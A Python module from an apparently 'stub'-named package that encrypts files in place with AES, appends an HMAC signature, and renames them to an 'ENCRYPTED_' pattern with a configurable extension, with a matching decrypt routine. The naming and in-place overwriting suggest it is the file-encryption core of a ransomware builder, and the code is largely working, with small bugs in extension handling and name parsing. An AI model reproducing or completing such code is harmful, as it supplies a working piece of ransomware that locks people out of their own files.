from stub.file import File
from stub.crypt import AES
from stub.types import EncryptionConfig
from stub.utils.misc import except_pass
import hashlib
import struct
import hmac

__all__ = ["CryptFile"]


class CryptFile:
    def __init__(self, file: File, p_key: bytes, cfg: EncryptionConfig) -> None:
        self.file = file
        self.p_key = p_key
        self.cryptor = AES(p_key)
        self.cfg = cfg

    def _struct_dump(self, encrypted_content: bytes) -> bytes:
        """
        typedef struct EncryptedFile {
            uint64_t size;
            uint8_t *encrypted_content;
            uint8_t signature[32];
        } EncryptedFile;

        * (8 Bytes [:7])(N Bytes [8:N-1])(32 Bytes [N:])
        """
        size_header = struct.pack(">Q", len(encrypted_content))  # Big Endian; uint64
        msg = size_header + encrypted_content
        signature = hmac.new(key=self.p_key, msg=msg, digestmod=hashlib.sha256).digest()
        msg += signature
        return msg

    @except_pass
    def _struct_load(self, fp: str) -> bytes | None:
        with open(fp, "rb") as f:
            size_header = f.read(8)
            if not size_header:
                return

            size = struct.unpack(">Q", size_header)[0]
            encrypted_content = f.read(size)
            if not encrypted_content:
                return

            signature = f.read(32)
            if not signature:
                return

            msg = size_header + encrypted_content
            real_signature = hmac.new(
                key=self.p_key, msg=msg, digestmod=hashlib.sha256
            ).digest()
            if hmac.compare_digest(signature, real_signature):
                return encrypted_content

        return

    def encrypt(self) -> None:
        with open(self.file.path, "rb") as f:
            content = f.read()

        encrypted_content = self.cryptor.encrypt(content, self.cryptor.generate_nonce())
        self.file.change_content(self._struct_dump(encrypted_content))

    def proper_rename(self) -> None:
        """
        Rename the file to the new encrypted name.
        """
        assert self.file.extension is not None
        extension = self.cfg.extension.removeprefix(".") or ".encrypted"
        name = f"ENCRYPTED_{self.file.name}_{self.file.extension.removeprefix('.')}.{extension}"
        self.file.rename(name)

    def decrypt(self) -> None:
        assert self.file.name is not None
        encrypted_content = self._struct_load(self.file.path)
        # File is either corrupted (~user modified it) or not encrypted
        if encrypted_content is None:
            return

        decrypted_content = self.cryptor.decrypt(encrypted_content)
        parts = self.file.name.split("ENCRYPTED_")[1].split(".")[0].split("_")
        name, extension = parts[0], parts[1]
        self.file.change_content(decrypted_content).rename(f"{name}.{extension}")
